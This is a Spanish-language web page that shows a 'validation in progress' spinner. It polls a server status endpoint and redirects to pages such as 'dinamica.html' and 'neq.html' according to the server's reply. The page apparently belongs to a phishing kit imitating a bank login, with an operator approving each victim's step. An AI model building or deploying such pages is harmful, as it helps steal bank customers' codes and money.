<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validaci√≥n en curso</title>
    <style>
        body {
            font-family: 'Manrope', sans-serif;
            background-color: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            background: white;
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        h1 {
            color: #200020;
            margin-bottom: 20px;
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #DA0081;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            color: #666;
            line-height: 1.6;
            margin: 20px 0;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 8px;
            font-weight: 600;
        }
        .status.checking {
            background: #fff3cd;
            color: #856404;
        }
        .status.success {
            background: #d4edda;
            color: #155724;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Validaci√≥n en curso</h1>
        <div class="loader"></div>
        <p>Por favor espere un momento mientras validamos la informaci√≥n ingresada, agradecemos su paciencia.</p>
        <div id="status" class="status checking">
            üîÑ Verificando informaci√≥n...
        </div>
        <p style="font-size: 0.9em; color: #999;">
            Por lo general este proceso no demora m√°s de 2 minutos.
        </p>
    </div>

    <script>
        const userId = localStorage.getItem("userId");
        const statusDiv = document.getElementById("status");
        let checkCount = 0;
        const maxChecks = 40; // 40 intentos x 3 segundos = 2 minutos

        if (!userId) {
            console.log("No userId found, redirecting...");
            setTimeout(() => {
                window.location.href = "index.html";
            }, 1000);
        }

        // Funci√≥n para verificar estado
        async function checkStatus() {
            try {
                // Obtener la URL base actual
                const baseUrl = window.location.origin;
                const response = await fetch(`${baseUrl}/api/check-status?userId=${userId}`);
                
                if (!response.ok) {
                    console.error('API response not ok:', response.status);
                    checkCount++;
                    if (checkCount >= maxChecks) {
                        statusDiv.textContent = '‚è±Ô∏è Tiempo agotado, redirigiendo...';
                        setTimeout(() => {
                            window.location.href = "dinamica.html";
                        }, 2000);
                        return true;
                    }
                    return false;
                }

                const data = await response.json();
                checkCount++;

                if (data.status === 'approved') {
                    statusDiv.className = 'status success';
                    statusDiv.textContent = '‚úÖ Verificaci√≥n exitosa';
                    setTimeout(() => {
                        window.location.href = data.nextPage || 'finish.html';
                    }, 1000);
                    return true;
                } else if (data.status === 'retry') {
                    statusDiv.className = 'status success';
                    statusDiv.textContent = 'üîÑ Redirigiendo...';
                    setTimeout(() => {
                        window.location.href = data.nextPage || 'dinamica.html';
                    }, 1000);
                    return true;
                } else if (data.status === 'error') {
                    statusDiv.className = 'status success';
                    statusDiv.textContent = '‚ö†Ô∏è Redirigiendo...';
                    setTimeout(() => {
                        window.location.href = data.nextPage || 'neq.html';
                    }, 1000);
                    return true;
                } else if (checkCount >= maxChecks) {
                    // Timeout despu√©s de 2 minutos
                    statusDiv.textContent = '‚è±Ô∏è Tiempo agotado, redirigiendo...';
                    setTimeout(() => {
                        window.location.href = 'dinamica.html';
                    }, 2000);
                    return true;
                }

                return false;
            } catch (error) {
                console.error('Error checking status:', error);
                checkCount++;
                
                // Si falla muchas veces, redirigir
                if (checkCount >= maxChecks) {
                    statusDiv.textContent = '‚è±Ô∏è Tiempo agotado, redirigiendo...';
                    setTimeout(() => {
                        window.location.href = "dinamica.html";
                    }, 2000);
                    return true;
                }
                
                return false;
            }
        }

        // Verificar cada 3 segundos
        const interval = setInterval(async () => {
            const shouldStop = await checkStatus();
            if (shouldStop) {
                clearInterval(interval);
            }
        }, 3000);

        // Primera verificaci√≥n despu√©s de 2 segundos
        setTimeout(() => {
            checkStatus();
        }, 2000);
    </script>
</body>
</html>
